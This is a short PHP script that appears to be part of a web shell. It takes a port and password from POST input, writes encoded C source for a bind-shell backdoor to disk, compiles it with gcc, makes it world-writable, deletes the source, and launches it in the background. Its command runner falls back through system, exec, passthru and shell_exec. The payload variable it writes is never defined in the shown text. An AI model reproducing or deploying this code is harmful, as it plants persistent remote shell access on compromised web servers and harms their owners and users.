<?php
function tulis($file,$text){
	$textz = gzinflate(base64_decode($text));
	 if($filez = @fopen($file,"w"))
	 {
		 @fputs($filez,$textz);
		 @fclose($file);
	 }
}

function exe($cmd){
	if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result){
			$buff .= $result;
		}
		return $buff;
	}
	elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('shell_exec')){
		$buff = @shell_exec($cmd);
		return $buff;
	}
}


$port = trim($_POST['port']);
$passwrd = trim($_POST['bind_pass']);
tulis("bdc.c",$port_bind_bd_c);
exe("gcc -o bdc bdc.c");
exe("chmod 777 bdc");
@unlink("bdc.c");
exe("./bdc ".$port." ".$passwrd." &");
$scan = exe("ps aux"); 
	
?>